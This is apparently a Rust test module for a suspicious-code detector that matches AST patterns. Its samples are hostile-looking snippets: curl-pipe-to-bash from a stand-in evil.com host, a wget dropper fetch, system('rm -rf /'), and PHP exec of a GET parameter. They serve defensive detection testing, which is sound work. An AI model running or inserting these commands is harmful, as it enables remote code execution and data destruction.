//! Test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for AST-based condition evaluators.

use super::*;
use crate::composite_rules::context::EvaluationContext;
use crate::composite_rules::types::{Arch, FileType, Platform};
use crate::types::{AnalysisReport, TargetInfo};
use std::sync::OnceLock;

fn create_test_report(path: &str) -> AnalysisReport {
    let target = TargetInfo {
        path: path.to_string(),
        file_type: "source".to_string(),
        size_bytes: 1024,
        sha256: "abc123".to_string(),
        architectures: None,
    };
    AnalysisReport::new(target)
}

fn create_test_context<'a>(
    report: &'a AnalysisReport,
    data: &'a [u8],
    file_type: FileType,
) -> EvaluationContext<'a> {
    EvaluationContext {
        ast_kind_cache: None,
        report,
        binary_data: data,
        file_type,
        platforms: vec![Platform::Linux],
        arch: vec![Arch::All],
        arch_ranges: None,
        additional_findings: None,
        cached_ast: None,
        finding_id_index: None,
        debug_collector: None,
        section_map: None,
        inline_yara_results: None,
        cached_kv_format: OnceLock::new(),
        cached_kv_parsed: OnceLock::new(),
        current_trait: None,
        current_source: None,
        string_exact_index: OnceLock::new(),
        string_exact_index_ci: OnceLock::new(),
        deadline: None,
        slow_rule_ms: 4000,
    }
}

// =============================================================================
// eval_ast tests - Simple mode (kind/node + pattern matching)
// =============================================================================

#[test]
fn test_eval_ast_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_python_function_call() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls -la")
exec("print('hello')")
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
}

#[test]
fn test_eval_ast_python_string_literal() {
    let report = create_test_report("/test/script.py");
    let source = r#"
url = "http://malicious.com/payload"
cmd = "/bin/sh"
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("malicious"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_exact_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = "ls"
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Note: In Python's AST, the string node includes the quotes: "ls"
    // So we use substr to match the content
    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("ls"), // substr match
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_regex_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
password1 = "secret"
password2 = "hunter2"
api_key = "abc123"
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        None,
        Some(r"password\d+"),
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_case_insensitive() {
    let report = create_test_report("/test/script.py");
    let source = r#"
Password = "SECRET"
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        Some("password"),
        None,
        None,
        true, // case insensitive
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_node_type_directly() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 42
y = "hello"
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Use node parameter instead of kind for direct node type matching
    let result = eval_ast(
        None,
        Some("integer"), // direct tree-sitter node type
        None,
        Some("42"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_shell_command() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl http://evil.com/payload | bash
wget http://malware.com/dropper
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Shell);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("curl"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_javascript_function_call() {
    let report = create_test_report("/test/script.js");
    let source = r#"
const code = "malicious";
eval(code);
new Function("return " + code)();
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("eval"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_go_function_call() {
    let report = create_test_report("/test/main.go");
    let source = r#"
package main

import (
    "os/exec"
)

func main() {
    exec.Command("bash", "-c", "whoami")
}
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Go);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("Command"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_rust_unsafe_block() {
    let report = create_test_report("/test/main.rs");
    let source = r#"
fn main() {
    unsafe {
        std::ptr::null::<i32>();
    }
}
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Rust);

    let result = eval_ast(
        None,
        Some("unsafe_block"),
        None,
        Some("unsafe"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_no_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
print("hello world")
x = 1 + 2
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_no_kind_or_node() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // No kind or node specified - should return no match
    let result = eval_ast(None, None, None, Some("hello"), None, None, false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// eval_ast_query tests - Advanced mode (tree-sitter queries)
// =============================================================================

#[test]
fn test_eval_ast_query_python() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls")
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Tree-sitter query to find os.system calls
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "os")
        (#eq? @method "system")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_javascript() {
    let report = create_test_report("/test/script.js");
    let source = r#"
document.write("<script>evil()</script>");
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);

    // Query for document.write calls
    let query = r#"(call_expression
        function: (member_expression
            object: (identifier) @obj
            property: (property_identifier) @method)
        (#eq? @obj "document")
        (#eq? @method "write")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_invalid_syntax() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Invalid query syntax
    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("((((invalid query syntax"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_shell() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl -s http://evil.com | bash
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Shell);

    // Query for pipe to bash
    let query = r#"(pipeline
        (command) @cmd1
        (command
            name: (command_name) @name
            (#eq? @name "bash"))) @pipe"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("(identifier) @id"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_no_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 1 + 2
print(x)
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Query for something that doesn't exist
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "subprocess")
        (#eq? @method "call")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// Edge cases and error handling
// =============================================================================

#[test]
fn test_eval_ast_invalid_utf8() {
    let report = create_test_report("/test/binary");
    let data = vec![0xff, 0xfe, 0x00, 0x01]; // Invalid UTF-8
    let ctx = create_test_context(&report, &data, FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_empty_source() {
    let report = create_test_report("/test/script.py");
    let source = "";
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_malformed_source() {
    let report = create_test_report("/test/script.py");
    // Syntactically invalid Python
    let source = r#"
def incomplete(
    x =
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    // Should handle parse errors gracefully
    assert!(!result.matched);
    // May have warnings about parse errors
}

#[test]
fn test_eval_ast_evidence_location() {
    let report = create_test_report("/test/script.py");
    let source = r#"
# Line 1
# Line 2
exec("malicious")  # Line 4
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
    // Evidence should include line/column location
    let location = result.evidence[0].location.as_ref().unwrap();
    assert!(location.contains(":")); // Format: "line:column"
}

#[test]
fn test_eval_ast_multiple_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(result.evidence.len() >= 3);
}

#[test]
fn test_eval_ast_match_count_supports_count_min() {
    // AST conditions return match_count, which is used by count_min/count_max
    // filtering at the TraitDefinition level. Verify match_count is accurate.
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
eval("code1")
exec("cmd4")
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    // match_count must reflect actual AST matches for count_min filtering to work
    assert_eq!(
        result.match_count, 4,
        "match_count should be 4 (one per exec call), got {}",
        result.match_count
    );
}

#[test]
fn test_eval_ast_query_match_count_single() {
    // Verify match_count = 1 when only one AST match exists
    let report = create_test_report("/test/script.py");
    let source = r#"exec("cmd")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert_eq!(result.match_count, 1);
}

#[test]
fn test_eval_ast_c_system_call() {
    let report = create_test_report("/test/main.c");
    let source = r#"
#include <stdlib.h>
int main() {
    system("rm -rf /");
    return 0;
}
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::C);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("system"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_php_exec() {
    let report = create_test_report("/test/index.php");
    let source = r#"<?php
$cmd = $_GET['cmd'];
exec($cmd);
?>"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Php);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_predicates_filter_correctly() {
    // Regression: dashed-ip-colon-regex was matching .replace(/[ \t\r\n]+/g," ")
    // because #eq? and #match? predicates were not filtering correctly.
    // The query should only match .replace(/<regex with colon>/, "-")
    let report = create_test_report("/test/prettify.js");
    let source = r#"ac.replace(/[ \t\r\n]+/g," ")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);

    // First, verify the query compiles and predicates are actually recognized
    let lang: tree_sitter::Language = tree_sitter_javascript::LANGUAGE.into();
    // WRONG: predicates outside the pattern's closing paren become separate patterns
    let wrong_query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
)
(#eq? @prop "replace")
(#match? @pat ":")
(#eq? @repl "-")"#;
    let compiled_wrong = tree_sitter::Query::new(&lang, wrong_query).expect("query should compile");
    assert_eq!(
        compiled_wrong.pattern_count(),
        4,
        "wrong query has 4 patterns (structural + 3 predicate-only patterns)"
    );

    // CORRECT: predicates inside the pattern's closing paren
    let query_str = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;
    let compiled = tree_sitter::Query::new(&lang, query_str).expect("query should compile");
    assert_eq!(
        compiled.pattern_count(),
        1,
        "correct query should have 1 pattern with predicates inside"
    );

    let result = eval_ast(None, None, None, None, None, Some(query_str), false, &ctx);

    assert!(
        !result.matched,
        "should NOT match .replace(/[ \\t\\r\\n]+/g,\" \") — \
         regex has no colon and replacement is space, not dash. \
         match_count={}, evidence={:?}",
        result.match_count, result.evidence
    );
}

#[test]
fn test_eval_ast_query_predicates_positive_match() {
    // Verify the same query DOES match when the replace has colon regex and dash replacement
    let report = create_test_report("/test/ip.js");
    let source = r#"addr.replace(/:/g,"-")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::JavaScript);

    let query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(
        result.matched,
        "should match .replace(/:/g,\"-\") — regex has colon and replacement is dash"
    );
}
